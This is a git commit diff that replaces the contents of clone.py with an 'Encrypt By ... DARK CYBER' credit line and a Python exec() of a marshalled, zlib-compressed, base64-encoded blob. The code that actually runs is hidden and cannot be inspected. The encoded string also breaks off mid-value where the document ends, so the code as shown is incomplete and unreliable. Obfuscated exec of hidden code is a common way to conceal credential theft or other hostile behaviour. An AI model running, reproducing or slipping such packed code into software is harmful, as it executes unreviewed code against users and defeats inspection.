0ae8a622434c78b9d4908cd2b532f3e438cdf3e2
sanjida9999 <101853629+sanjida9999@users.noreply.github.com>
2022-03-18 23:45:32 +0600

    Update clone.py

--- clone.py
+++ clone.py
@@ -1,1 +1,5 @@
-Xtentipn
+#
+Encrypt By SHANTO HASAN #D A  R K C Y B E R(https://github.com/Dark-Cyber-07)
+
+import marshal,zlib,base64
+exec(marshal.loads(zlib.decompress(base64.b64decode("eJzsvT2TZctynndB0tV/kAxG8E8o4kTIVEA0GPLFIOVIhEVLJGQM7wFImNK9AEMuwRCAf6FA6AOmRIJtjyl50z3Ts3s8zfT0Adfkrp3VWe9TmbVWLwbPPVhnd+29VlV+vPnmx/pHv3r5f3/n6z8/ff3nn/5nX//nH//qVz9//d/f+dV/+/V//9avfv07v/rvfudXv/5bv/rHf/tXf+e//vo//+Dvffvzf/S3vv7Pt3/+9td//otva/+Tr//z+7/zbeHv/+rb3/+Dv/ft4//qn/6nf/6f/84//+n/+ONf/8nPf/DTv3/323/x87uf/vJP/vynv3r3279496/+7j//6f/8k9/85k/+15/+w//0R//LT//XH/3pv/q3/+Knf/dvf/rf3/3xT//Puz/+l1//9e//7b9+99O/e/dv/uinv/yjP/7Tr//tp//w5+++LvxXf/qn//rf/LN/+A//5fOi//LXf/Lbf/iXd//vf/NXn/76//v0V3/37/7Bn/3Br3/3d3/z/Rd/7/f++5++/v9/9tPv/e6/+B//t99//2e/fnz/Z1++/vP08eu/P3/996ev/zx+/eDnr//h6f7rf/z2Hx5ePrj/tuLh+1++e/p28fQf/+rdl+//99PTP3n+5s/f/+7Lx5d/vq35/O2bv/3kt7/7+vdfvnz7y8v3i3fffvLrF757/slvf/nw7eLbX3x6+ZnnO7v/5eLrvy/bDz5+X/vl8nKr39Z/+/Tdt39/ebn35599fPm1v/mal/t69/w8z/f/fCcfv//
